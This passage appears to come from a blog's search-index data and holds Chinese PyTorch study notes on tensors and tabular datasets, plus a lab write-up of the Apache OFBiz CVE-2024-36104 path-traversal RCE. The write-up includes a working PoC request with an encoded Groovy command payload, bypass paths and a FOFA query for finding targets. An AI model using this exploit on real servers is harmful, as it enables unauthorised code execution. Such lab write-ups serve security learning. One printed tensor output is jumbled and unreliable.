1.0000]])\n\n数据集统计了以下信息。记录的索引：instant。日期：day。季节：season（1表示春季，2表示夏季，3表示秋季，4表示冬季）。年：yr（0表示2011年，1表示2012年）。月：mnth（1～12）。时：hr（0～23）。节假日：holiday。工作日：weekday。工作日状态：workingday。天气状况：weathersit（1表示晴天，2表示雾，3表示小雨/小雪，4表示大雨/大雪）。摄氏温度（°C）：temp。感知温度（°C）：atemp。湿度：hum。风速：windspeed。临时用户：casual。注册用户：registered。租赁单车数目：cnt。\n\n在这样的时间序列数据集中，行表示连续的时间点，有一个维度可以他们对他们进行排序，可以试着根据一天中的某一个时间段来预测自行车的数量，这个就是后面的内容了，暂时不深究，目前专注于学习将共享单车的数据集转换为神经网络能够消化的固定大小的数据块\n这个神经网络需要知道每一个不同信息量的一系列的值，例如乘车次数，当日时间，温度和天气等，N个大小为C的对比序列，其中在神经网络的标准中，C代表通道，和一维数据的列一样，N维代表时间轴\n按照时间段来调整数据我们可能想要将2年的数据集分成更细的观察周期，如按天划分，这两我们就有了序列长度为L，样本数量为N的集合C，我们的时间序列数据集将是一个维度为3，形状为NxCxL的张量\n回到数据集，为了获得每一个小时的数据集，我们需要做的就是以24个小时为单位来查看同一个张量，让我们看看bikes张量的形状和步长\ntorch.Size([10886, 12]) (12, 1)\n\n有10886个小时，12列，现在我们重新调整数据，让它有3个轴，即日，小时\n# -1: 自动计算天数（总行数除以24）# 24: 每天24小时，将数据按每24行分组# bikes.shape[1]: 保持原始特征数量不变（12个特征）daily_bikes = bikes.view(-1, 24, bikes.shape[1])print(daily_bikes.shape,daily_bikes.stride())输出torch.Size([453, 24, 12])\n\n关键是对view的调用，他会改变张量查看存储的相同数据的方法，最右边的维度是原始数据集中的列数，然后中间的维度是时间，将其分割成为连续的24小时，我们需要转置张量：\ndaily_bikes = daily_bikes.transpose(1, 2)  # 交换维度，方便后续分析print(daily_bikes.shape,daily_bikes.stride())输出daily_bikes = daily_bikes.transpose(1, 2)  # 交换维度，方便后续分析print(daily_bikes.shape,daily_bikes.stride())\n\n准备训练天气状态变量是有序的，它有四个级别，1表示晴天，4表示大雨/大学，我们可以讲这个变量视为分类变量，将级别解释为标签，或者看成连续变量\n为了更容易呈现数据，我们暂时只关注第一天的数据，我们初始化一个0填充矩阵，其行数等于一天中的小时数，列数等于天气情况级别数\nfirst_day = bikes[:24].long()# print(first_day)weather_onehot = torch.zeros(first_day.shape[0], 4)print(first_day[:,4])#输出所有行，第5列的天气情况输出tensor([1, 1, 1, 1, 1, 2, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 2, 3, 3, 2, 2, 2, 2])\n\n然后根据每行对应的级别将1散置到矩阵中，\n# 使用scatter_函数进行独热编码转换# 参数说明：# 1: 表示在第2维（列）上进行散射（索引从0开始）# first_day[:,4]: 选择第5列（天气状况，值范围1-4）# .unsqueeze(1): 将一维张量转换为二维，在第2维增加一个维度，使形状从[24]变为[24,1]# .long(): 将数据类型转换为长整型，因为索引必须是整数# - 1: 将天气状况值（1-4）转换为索引（0-3）# 1.0: 在对应位置填充的值weather_onehot.scatter_(    1,                                    # dim: 在第2维上进行散射    first_day[:,4].unsqueeze(1).long() - 1,  # index: 天气状况值转换为索引    1.0                                   # value: 填充值)print(weather_onehot)输出tensor([[1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [0., 1., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [1., 0., 0., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.],        [0., 0., 1., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.],        [0., 1., 0., 0.]])\n\n最后我们使用cat函数将矩阵连接到原始数据集，让我们看看第一个结果\n# 将原始数据和独热编码后的天气数据拼接在一起，并显示第一个小时的所有特征# torch.cat: 在指定维度上连接张量# 参数说明：# [bikes[:24], weather_onehot]: 要连接的张量列表，包含：#   - bikes[:24]: 第一天24小时的原始特征数据#   - weather_onehot: 天气状况的独热编码（24小时×4种天气）# 1: 在第2维（列）上进行连接，即将特征拼接在一起# [:1]: 只选择第一行（第一个小时）的数据print(torch.cat([bikes[:24], weather_onehot], 1)[:1])输出tensor([[ 0.0000,  1.0000,  0.0000,  0.0000,  1.0000,  9.8400, 14.3950, 81.0000,          0.0000,  3.0000, 13.0000, 16.0000,  1.0000,  0.0000,  0.0000,  0.0000]])\n\n在这里我们指定了原始张量bikes，以及沿着列连接的独热编码的天气状况矩阵，为了使cat成功。张量必须在其他的维度上具有相同的大小\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-10day","url":"/2025/05/09/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-10day/","content":"学习的机制学习就是参数估计​\t获取数据，选择模型并估计模型的参数，以便于它能够对新数据做出良好的预测，给定输入数据和相应的期望的输出，以及权重的初始值，给模型输入数据，并通过对输出结果与实际数据进行比较来评估误差，为了优化模型参数，即他的权重，权重单位变化后的误差变化是是使用复合函数的导数的链式法则计算的，然后再使误差减少的方向上更新权重，重复这个过程，知道根据位置的数据评估的误差降到可接受的水平，这么说可能听不懂，接着往下\n​\t现在我们处理一个有噪声的数据集的问题，建立一个模型，并为他实现一个学习的算法\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-4day","url":"/2025/04/16/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-4day/","content":"张量的元素类型到目前为止，已熟知张量的基本知识，但是还没有不晓得可以在张量中储存什么类型，数据科学库依赖于numpy或引入专用的数据结构，如pytorch张量，提供数字类型的数据的有效底层实现和相关操作，并将这些封装在一个方便的高级api中，要实现这一点，张量中的对象必须是相同类型的数字，pytorch必须跟踪这个数字类型\n使用dtype指定数字类型张量构造函数通过dtype参数指定包含在张量中的数字的数据类型，如tensor和zeros和ones函数，数据 类型用于指定张量可以保存的可能值，dtype参数类似于同名的标准numpy参数\n  torch.float32或torch.float：32位浮点数。  torch.float64或torch.double：64位双精度浮点数。  torch.float16或torch.half：16位半精度浮点数。  torch.int8：8位有符号整数。  torch.uint8：8位无符号整数。  torch.int16或torch.short：16位有符号整数。  torch.int32或torch.int：32位有符号整数。  torch.int64或torch.long：64位有符号整数。  torch.bool：布尔型。张量的默认数据类型是32位浮点数。用法# 创建float32类型张量（默认）a = torch.ones(3, dtype=torch.float32)# 创建float64（双精度）张量b = torch.randn(6, dtype=torch.float64)# 创建int32类型张量c = torch.zeros(4, dtype=torch.int32)\n\n管理张量的dtype属性为了给张量分配一个正确的数字类型，我们可以指定适当的dtype作为构造函数的参数，如：\na = torch.ones(3, dtype=torch.float32)\n\n可以通过访问相对应的属性dtype来访问一个张量的类型\n还可以使用相对应的转换方法将张量创建函数的输出转化为正确的类型，\ndouble_points = torch.zeros(10, 2).double() short_points = torch.ones(10, 2).short()或者使用更方便的方法：double_points = torch.zeros(10, 2).to(torch.double) short_points = torch.ones(10, 2).to(dtype=torch.short)\n\n在操作中输入多种类型的时候，输入会自动向较大类型转换，因此，如果我们想要进行32位计算，我们需要确保所有的输入都是32位的\npoints_64 = torch.rand(5, dtype=torch.double) points_short = points_64.to(torch.short) points_64 * points_short tensor([0., 0., 0., 0., 0.], dtype=torch.float64)\n\n张量的api到此，了解了什么是张量，以及他们在底层是如何工作的，关于张量以及张量种的绝大多数操作都可以在torch模块种找到，如transpose函数\n在PyTorch中，张量(Tensor)的API是指所有可以对张量进行操作和变换的方法和属性的集合。\n\n对张量操作按组进行划分\n创建操作—用于构造张量的函数，如ones()和from_numpy()。索引、切片、连接、转换操作—用于改变张量的形状、步长或内容的函数，如transpose()。数学操作—通过运算操作张量内容的函数：\t● 逐点操作—通过对每个元素分别应用一个函数来得到一个新的张量，如abs()和\t\tcos()；\t● 归约操作—通过迭代张量来计算聚合值的函数，如mean()、std()和norm()；\t● 比较操作—在张量上计算数字谓词的函数，如equal()和max()；\t● 频谱操作—在频域中进行变换和操作的函数；\t● 其他操作—作用于向量的特定函数（如cross()），或对矩阵进行操作的函数（如\ttrace()）；\t●  BLAS和LAPACK操作—符合基本线性代数子程序（Basic Linear Algebra Subprogram，BLAS）规范的函数，用于标量、向量—向量、矩阵—向量和矩阵—矩阵操作。随机采样—从概率分布中随机生成值的函数，如randn()和normal()。序列化—保存和加载张量的函数，如load()和save()。并行化—用于控制并行CPU执行的线程数的函数，如set_num_threads()。\n\n","categories":["深度学习"],"tags":["深度学习"]},{"title":"深度学习-7day","url":"/2025/04/21/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-7day/","content":"三维图像：体数据前文所提到如何加载和表示二维图像，在某些情况下，例如设计到ct的医学成像应用程序，我们通常需要处理从头到叫的大量图像序列，每一个序列代表人体的一个切片，ct中只有一个单一的强度通道，类似于灰度通道，这意味着通道维度通常在原生数据格式中被忽略，因此原生数据通常有三个维度\n存储体数据的张量和图像没任何区别，在通道维度之后，我们有一个额外的维度，即深度，从而得到一个5维的张量\n加载特定格式使用imageio模块中的volread函数加载一个ct扫描样本，该函数接受将目录作为参数，并将所有医学数字成像和通信文件汇编为一个numpy三维数组\nimport imageiodir_path = \"图像路径\"vol_arr = imageio.voread(dir_path,'DICOM')print(vol_arr.shape)\n\n由于没有通道信息，布局与pytorch期望的不同，我们必须使用unsqueeze为通道维度流出空间\nvol = torch.from_numpy(vol_arr).float()vol = torch.unsqueeze(vol,0)\n\n表示表格数据在机器学习中遇到最简单的数据形式是电子表格，csv文件或者是数据库，无论介质是什么，他都是一张表，每一行包含一个样本或者是记录，其中的列包含关于样本的一部分信息\n列可以包含数字，如特定位置的温度或者是标签，以及表示样本属性的字符串，因此，表格数据通常是不是同构的\n使用真实的数据集作为深度学习的实践者，是将真实世界的异构数据编码为浮点数张量，以供神经网络使用，在互联网上我们可以免费或者大量的白哦个数据集，github上有一堆免费开源的数据集\n下面举一个例子，葡萄酒的质量数据集是一个免费提供的表格数据集，它包含葡萄牙北部葡萄酒的化学特征以及感官质量评分，可以直接从github上下载\n在这个数据集上一个可能的机器学习任务是根据化学特征预测质量评分，如下图所示，我们希望找到数据中化学特征列和质量评分列之间的关系\n\n加载葡萄酒数据张量我们需要一种比在文本编辑器中打开文件更有用的检查数据的方法，让我们看啊可能如何使用python加载数据，然后将其转化为张量，pytorch提供了几种可选的加载csv文件的方法\n·python自带的csv模块·numpy·pandas\n\n建议使用numpy，pytorch具有出色的numpy互操作性\n# 导入csv模块，用于处理CSV文件import csv# 导入numpy库并简写为np，numpy是一个强大的数值计算库import numpy as np# 设置红酒质量数据集的文件路径，使用绝对路径确保能准确找到文件wine_path = \"E:\\\\code\\\\staticlist\\\\explore-RedwineQuality-Data-master\\\\wineQualityReds.csv\"# 使用numpy的loadtxt函数加载CSV数据：# - dtype=np.float32 指定数据类型为32位浮点数# - delimiter=\",\" 指定CSV文件的分隔符为逗号# - skiprows=1 跳过第一行（通常是标题行）wineq_numpy = np.loadtxt(wine_path, dtype=np.float32, delimiter=\",\", skiprows=1)# 打印加载的数据数组，查看数据内容print(wineq_numpy)输出[[1.000e+00 7.400e+00 5.900e-01 ... 5.000e-01 9.000e+00 4.000e+00] [2.000e+00 7.800e+00 8.800e-01 ... 6.800e-01 9.800e+00 5.000e+00] [3.000e+00 7.800e+00 7.600e-01 ... 6.500e-01 9.800e+00 5.000e+00] ... [1.597e+03 6.300e+00 5.100e-01 ... 7.500e-01 1.100e+01 6.000e+00] [1.598e+03 5.900e+00 6.450e-01 ... 7.100e-01 1.020e+01 5.000e+00] [1.599e+03 6.000e+00 3.100e-01 ... 6.600e-01 1.100e+01 6.000e+00]]\n\n这里我们之规定了二维数组的类型，用于分割每一行数据的分隔符以及不读取第一行，可以检查一下是否读取了所有的数据\ncol_list = next(csv.reader(open(wine_path), delimiter=','))#打开指定路径的csv文件，使用reader创建一个csv读取器，设置分隔符为都好，使用next获取文件的第一行，将这些列名存储在变量中print(wineq_numpy.shape,col_list)\n\n继续将numpy数组转化为pytorch张量\nwineq = torch.from_numpy(wineq_numpy)print(wineq.shape,wineq.dtype,wineq.stride,wineq.storage)#对张量的一些操作输出torch.Size([1599, 13]) torch.float32 &lt;built-in method stride of Tensor object at 0x00000242184A4A50&gt; &lt;bound method Tensor.storage of tensor([[1.0000e+00, 7.4000e+00, 5.9000e-01,  ..., 5.0000e-01, 9.0000e+00,         4.0000e+00],        [2.0000e+00, 7.8000e+00, 8.8000e-01,  ..., 6.8000e-01, 9.8000e+00,         5.0000e+00],        [3.0000e+00, 7.8000e+00, 7.6000e-01,  ..., 6.5000e-01, 9.8000e+00,         5.0000e+00],        ...,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 7.5000e-01, 1.1000e+01,         6.0000e+00],        [3.0000e+00, 7.8000e+00, 7.6000e-01,  ..., 6.5000e-01, 9.8000e+00,         5.0000e+00],        ...,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 7.5000e-01, 1.1000e+01,         6.0000e+00],        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 7.1000e-01, 1.0200e+01,         5.0000e+00],        ...,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 7.5000e-01, 1.1000e+01,         6.0000e+00],        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 7.1000e-01, 1.0200e+01,        ...,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 7.5000e-01, 1.1000e+01,         6.0000e+00],        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 7.1000e-01, 1.0200e+01,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 7.5000e-01, 1.1000e+01,         6.0000e+00],        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 7.1000e-01, 1.0200e+01,        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 7.1000e-01, 1.0200e+01,         5.0000e+00],         5.0000e+00],        [1.5990e+03, 6.0000e+00, 3.1000e-01,  ..., 6.6000e-01, 1.1000e+01,        [1.5990e+03, 6.0000e+00, 3.1000e-01,  ..., 6.6000e-01, 1.1000e+01,         6.0000e+00]])&gt;\n\n至此，我们从数据集中获得了一个浮点数的torch.Tensor对象，它包含所有列，也包括表示质量评分的最后一列\n表示分数我们可以将分数视为一个连续变量,把它当作一个实数，然后执行回归任务，或者将其视为一个标签,并尝试在分类任务总根据化学特征分析猜测标签，然后执行回归任务，或者将其视为一个标签，并尝试在分类任务中根据化学特征分析猜测标签，将其保存在单独的张量中，这样就可以将分数作为基本事实而不必将其输入模型中\ndata = wineq[:, :-1]print(data,data.shape)输出tensor([[1.0000e+00, 7.4000e+00, 5.9000e-01,  ..., 3.3800e+00, 5.0000e-01,         9.0000e+00],        [2.0000e+00, 7.8000e+00, 8.8000e-01,  ..., 3.2000e+00, 6.8000e-01,         9.8000e+00],        [3.0000e+00, 7.8000e+00, 7.6000e-01,  ..., 3.2600e+00, 6.5000e-01,         9.8000e+00],        ...,        [1.5970e+03, 6.3000e+00, 5.1000e-01,  ..., 3.4200e+00, 7.5000e-01,         1.1000e+01],        [1.5980e+03, 5.9000e+00, 6.4500e-01,  ..., 3.5700e+00, 7.1000e-01,         1.0200e+01],        [1.5990e+03, 6.0000e+00, 3.1000e-01,  ..., 3.3900e+00, 6.6000e-01,         1.1000e+01]]) torch.Size([1599, 12])\n\n如果想要将target张量转换为标签张量，我们可以有 两种方法，这取决于我们使用分类数据的策略或目的\ndata = wineq[:, :-1].long()print(data)输出tensor([[   1,    7,    0,  ...,    3,    0,    9],        [   2,    7,    0,  ...,    3,    0,    9],        [   3,    7,    0,  ...,    3,    0,    9],        ...,        [1597,    6,    0,  ...,    3,    0,   11],        [1598,    5,    0,  ...,    3,    0,   10],        [1599,    6,    0,  ...,    3,    0,   11]])\n\n","categories":["深度学习"],"tags":["深度学习"]},{"url":"/2025/07/18/Apache%20ofiz%E6%BC%8F%E6%B4%9E/cve-2024-36104/cve-2024-36104/","content":"CVE-2024-36104路径遍历漏洞导致的rce成因是未对用户的输入的contextPath参数进行充分的验证，这使得未授权的攻击者能够通过精心构造的恶意请求绕过认证机制，进而访问系统中本应收到保护的敏感接口，最终引发rce\n漏洞受影响版本Apache OFBiz &lt; 18.12.14Fofa搜索语法app=”Apache_OFBiz”\n漏洞原理分析Apache采用ControlServet和ControlFilter来处理请求路径，其路由规则如下：在在默认设置下，请求路径被解析为：/webtools/control/，其中对应controller.xml文件所定义的接口。\n关键问题OFBiz的路径解析逻辑存在漏洞，未对路径层级进行严格校验，导致以下两种请求会被视为等效：\n\n合法路径：/webtools/control/ProgramExport\n嵌套路径：/webtools/control/forgotPassword/ProgramExport\n\n漏洞触发的根本原因接口权限控制失效forgotPassword是无需认证的公开接口，而ProgramExport是需要认证的高危接口。当用户访问/forgotPassword/ProgramExport时：权限检查：系统先检查forgotPassword的权限，允许访问。路由映射：后续路径ProgramExport被错误地当作子接口处理，绕过了ProgramExport本身的权限校验。\n漏洞利用中使用的%2e（.的URL编码）是显式的路径遍历。例如，/forgotPassword/%2e/%2e/ProgramExport等价于/ProgramExport。/webtools/control/forgotPassword;/ProgramExport也能成功访问。而直接访问/forgotPassword/ProgramExport能成功，是因为OFBiz的路由逻辑自动忽略了中间路径，本质上与路径遍历效果相同。官方修复方式验证在Apache OFBiz 18.12.14版本中，官方采取以下方式修复：\n\n严格路径校验要求请求路径必须精确匹配controller.xml中定义的接口，禁止多级路径嵌套。\n显式权限控制对ProgramExport等敏感接口强制进行二次鉴权。\n\n漏洞复现以春秋云境中的靶场为例\n直接给出poc\nPOST /webtools/control/forgotPassword/././ProgramExport HTTP/1.1、或者访问以下铭感路由https://127.0.0.1:8443/webtools/control/main/../ProgramExporthttps://127.0.0.1:8443/webtools/control/main/;/ProgramExporthttps://127.0.0.1:8443/webtools/control/main/%2e/%2e/ProgramExportHost: 39.106.48.123:36646Cookie: JSESSIONID=2A2143A74051B80F86479CE4543B034E.jvm1; OFBiz.Visitor=10000User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 OpenWave/93.4.3797.32Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflate, brUpgrade-Insecure-Requests: 1Sec-Fetch-Dest: documentSec-Fetch-Mode: navigateSec-Fetch-Site: noneSec-Fetch-User: ?1Sec-Ch-Ua-Platform: \"Windows\"Sec-Ch-Ua: \"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not=A?Brand\";v=\"24\"Sec-Ch-Ua-Mobile: ?0Priority: u=0, iTe: trailersConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 302groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0063\\u0061\\u0074\\u0020\\u002f\\u0066\\u006c\\u0061\\u0067\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b或者通俗版本POST /webtools/control/forgotPassword/%2e/%2e/ProgramExport HTTP/1.1Host: &lt;目标IP&gt;:&lt;端口&gt;Content-Type: application/x-www-form-urlencodedContent-Length: 302groovyProgram=\\u0074\\u0068\\u0072\\u006f\\u0077\\u0020\\u006e\\u0065\\u0077\\u0020\\u0045\\u0078\\u0063\\u0065\\u0070\\u0074\\u0069\\u006f\\u006e\\u0028\\u0027\\u0069\\u0064\\u0027\\u002e\\u0065\\u0078\\u0065\\u0063\\u0075\\u0074\\u0065\\u0028\\u0029\\u002e\\u0074\\u0065\\u0078\\u0074\\u0029\\u003b\n\npost传参传入要执行的命令，这里执行的远程命令是\nthrow new Exception('cat /flag'.execute().text);\n\n直接看效果\n或者可以使用工具nuclei直接扫描\n\n危害\n未授权访问：攻击者无需认证，通过构造恶意请求，可绕过验证机制，访问本应受限的敏感接口，进而获取系统中敏感信息，如用户数据、商业机密等，严重威胁数据的保密性。\n远程代码执行：漏洞允许攻击者利用/webtools/control/ProgramExport接口的编程导出功能，执行任意 Groovy 代码，从而实现远程代码执行，完全控制受影响的系统，可进行数据篡改、删除、植入恶意软件等操作，对系统的完整性和可用性造成极大破坏。\n权限提升：攻击者可借此漏洞从低权限用户提升至高权限用户，进而执行更广泛的系统操作，对整个系统的安全构成严重威胁。\n中间人攻击风险：攻击者可利用该漏洞篡改系统返回给合法用户的响应内容，实施中间人攻击，进一步获取用户敏感信息或向用户传播恶意内容。\n大规模攻击风险：由于 Apache OFBiz 在电子商务领域的广泛应用，该漏洞的存在使得大量系统面临被攻击的风险，一旦被大规模利用，可能导致众多企业及用户的业务中断、数据泄露等严重后果，影响范围广泛。\n\n收获，一个新的工具和一个cve漏洞\n"},{"title":"深度学习-8day","url":"/2025/04/23/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-8day/","content":"表示表格数据使用独热编码另一种方法是构建分数的一个独热编码，就是将10个分数分别编码到一个由10个元素组成的向量中，除了其中一个元素设置为1，其他的元素都设置为0，它的主要作用包括：\n\n处理分类数据 ：将分类特征（如颜色、品牌等）转换为数值形式，使机器学习算法能够处理。\n避免序数关系 ：防止算法错误地解释类别之间存在大小关系。例如，如果将”红、绿、蓝”编码为1、2、3，算法可能会误认为蓝色(3)比红色(1)更重要。\n增加特征维度 ：每个类别变成一个二进制特征，使模型能够学习到每个类别的独立影响。\n提高模型表达能力 ：特别是对于树模型以外的算法（如线性回归、神经网络等），独热编码可以帮助模型更好地学习非线性关系。\n\n如果分数是完全离散的，比如葡萄酒的品种，那么采用独热编码更为合适，因为没有隐含的顺序和距离，独热编码也适用于分数介于整数分数之间的定量分数\n我们可以使用scatter_()方法获得一个独热编码，该方法将沿着参数提供的索引方向，将源张量的值填充大输入张量中\ntarget_onebot = torch.zeros(target.shape[0],10)target_onehot.scatter_(1,target.unsequeeze(1),1.0)这里需要保证target是一个一维向量，我们可以选择数据集的最后一列，然后通过unsequeeze方法扩充维度#关于scatter_()函数的参数指定以下2个参数的维度。一个列张量，表示要散射的元素的索引张量。包含要散射的元素的张量，或要散射的单个标量（在这种情况下为1.0）\n\n如果我们想将分数作为网络的分类输入，就必须将它转化为一个独热编码张量\n何时分类现在已经知道了处理连续数据和分类数据的方法，但是前面有序数据是如何处理的呢，处理这些数据没有通用的方法，最常见的是将这些数据视为分类数据或者连续数据\n\n回到张量data，它包含与化学特征分析相关的11个变量，我们可以使用pytorch张量api中的函数来处理张量表格数据，让我们首先获得每一列的平均值和标准差\ndata_mean = torch.mean(data, dim=0)#- 计算 data 张量沿着维度0（行维度）的平均值- 这意味着对每一列的所有数值求平均，得到每个特征的平均值print(data_mean)输出tensor([8.0000e+02, 8.3196e+00, 5.2782e-01, 2.7098e-01, 2.5388e+00, 8.7467e-02,        1.5875e+01, 4.6468e+01, 9.9675e-01, 3.3111e+00, 6.5815e-01, 1.0423e+01])获取方差data_var = torch.var(data, dim=0)#- 这行代码计算了 data 张量沿着维度0（行维度）的方差- torch.var() 是PyTorch中计算方差的函数- dim=0 参数指定沿着第一个维度（行）计算方差- 方差是衡量数据分散程度的统计量，它表示数据点与平均值之间差异的平方的平均值- 对于每个特征（列），这个函数计算所有样本在该特征上的方差- 结果是一个一维张量，包含每个特征的方差值print(data_var)输出tensor([2.1320e+05, 3.0314e+00, 3.2062e-02, 3.7947e-02, 1.9879e+00, 2.2151e-03,        1.0941e+02, 1.0821e+03, 3.5620e-06, 2.3835e-02, 2.8733e-02, 1.1356e+00])\n\n我们还可以通过减去平均值并除以标准差来对数据进行归一化，这有助于我们的学习过程\ndata_normalized = (data - data_mean) / torch.sqrt(data_var)print(data_normalized)输出tensor([[-1.7304, -0.5282,  0.3473,  ...,  0.4462, -0.9330, -1.3353],        [-1.7283, -0.2985,  1.9668,  ..., -0.7197,  0.1289, -0.5846],        [-1.7261, -0.2985,  1.2967,  ..., -0.3311, -0.0481, -0.5846],        ...,        [ 1.7261, -1.1600, -0.0995,  ...,  0.7053,  0.5419,  0.5415],        [ 1.7283, -1.3897,  0.6544,  ...,  1.6769,  0.3059, -0.2092],        [ 1.7304, -1.3323, -1.2165,  ...,  0.5110,  0.0109,  0.5415]])        标准化处理的主要作用包括：1. 使不同量纲的特征具有可比性，消除量纲影响2. 加速梯度下降的收敛3. 提高模型的数值稳定性4. 使特征对模型的贡献更加均衡5. 有助于正则化，防止某些特征因为数值较大而主导模型\n\n寻找阈值接下来，让我们分析数据，看看是否有一种简单的方法可以快速分辨出好酒和劣质酒，首先，我们要确定target中哪些行对应的分数小于或者等于3\nbad_indexes = target &lt;= 3#前面提到target是复制所有行和最后一列，检测哪一行对应分数小于3print(bad_indexes.shape, bad_indexes.dtype, bad_indexes.sum())输出torch.Size([1599]) torch.bool tensor(10)\n\n只有10个bad_indexs记录项被设置为True，通过使用pytorch中高级索引的功能，我们可以使用数据类型torch.bool来索引张量data，这实际上是在过滤张量data，使其仅仅包含索引张量中与True对应的项或者行，张量bad_ubdexs与张量target具有相同的形状，其值为True或者是False取决于我们的阈值与原始张量target的比较结果\nbad_data = data[bad_indexes]#索引出data中哪些行分数小于3，高级索引功能print(bad_data.shape)输出torch.Size([10, 12])\n\n新的张量bad_data有10行，与张量bad_indexes中true的函数相等，它保留了所有列，现在开始我们可以把葡萄酒分为好酒，中等酒和劣质酒3类，让我们对每一行使用mean()函数\n实现了根据红酒质量评分将数据分组，并计算各组特征的平均值，最后以格式化方式打印比较结果#数据分组bad_data = data[target &lt;= 3]mid_data = data[(target &gt; 3) &amp; (target &lt; 7)]good_data = data[target &gt;= 7]#计算各组平均值bad_mean = torch.mean(bad_data, dim=0)mid_mean = torch.mean(mid_data, dim=0)good_mean = torch.mean(good_data, dim=0)- 对每组数据沿着维度0（行维度）计算平均值- 结果是三个一维张量，每个张量包含对应组别中每个特征的平均值- 这样可以比较不同质量红酒在各个特征上的平均差异for i,args in enumerate(zip(col_list,bad_mean,mid_mean,good_mean)):    print('{:2} {:20} {:6.2f} {:6.2f} {:6.2f}'.format(i,*args))- 使用 zip 函数将特征名称（ col_list ）和三组平均值合并为元组序列- enumerate 添加了索引计数- 格式化打印每个特征的信息：- {:2} ：索引号，占2个字符位置- {:20} ：特征名称，占20个字符位置- {:6.2f} ：平均值，占6个字符位置，保留2位小数- *args 将元组解包为多个参数传入 format 方法     输出 0                      1053.20 793.14 831.71 1 fixed.acidity          8.36   8.24   8.85 2 volatile.acidity       0.88   0.54   0.41 3 citric.acid            0.17   0.26   0.38 4 residual.sugar         2.63   2.51   2.71 5 chlorides              0.12   0.09   0.08 6 free.sulfur.dioxide   11.00  16.21  13.98 7 total.sulfur.dioxide  24.90  48.46  34.89 8 density                1.00   1.00   1.00 9 pH                     3.40   3.31   3.2910 sulphates              0.57   0.65   0.7411 alcohol                9.95  10.25  11.52\n\n这里能发现一些问题，劣质葡萄酒的二氧化硫的含量似乎更高，我们可以使用二氧化硫的总量的阈值来作为区分好酒和劣质酒的粗略标准，让我们看看二氧化硫总量低于我们之前计算的平均值的索引\ntotal_sulfur_threshold = 141.83#设定了一个阈值值141.83，这个值用于判断红酒的总二氧化硫含量total_sulfur_data = data[:,6]#从数据集中提取第7列（索引为6）的数据，这一列代表红酒的总二氧化硫含量predicted_indexes = torch.lt(total_sulfur_data,total_sulfur_threshold)- 使用 torch.lt 函数（less than，小于）比较每个样本的总二氧化硫含量是否小于设定的阈值- 返回一个布尔型张量，对于总二氧化硫含量小于141.83的样本，对应位置为 True ，否则为 Falseprint(predicted_indexes.shape, predicted_indexes.dtype,predicted_indexes.sum())输出torch.Size([1599]) torch.bool tensor(1599)\n\n接下来，我们需要得到真正好酒的索引\nactual_indexes = target &gt; 5print(actual_indexes.shape, actual_indexes.dtype,actual_indexes.sum())输出torch.Size([1599]) torch.bool tensor(855)\n\n实际上的优质葡萄酒要比通过阈值测出的数量多，大概700瓶，现在我们看啊可能我们的预测和实际排名是否相符\nn_matches = torch.sum(actual_indexes &amp; predicted_indexes).item()#进行逻辑与操作，找出同时满足两个条件的样本：实际质量好（评分&gt;5）且预测为质量好（总二氧化硫&lt;141.83）n_predicted = torch.sum(predicted_indexes).item()#计算模型预测为高质量的红酒样本总数n_actual = torch.sum(actual_indexes).item()#计算实际高质量（评分&gt;5）的红酒样本总数print(n_matches, n_matches / n_predicted, n_matches / n_actual)#打印三个指标：- 真正例数量- 精确率（Precision）：正确预测为高质量的样本占所有预测为高质量样本的比例- 召回率（Recall）：正确预测为高质量的样本占所有实际高质量样本的比例输出855 0.5347091932457786 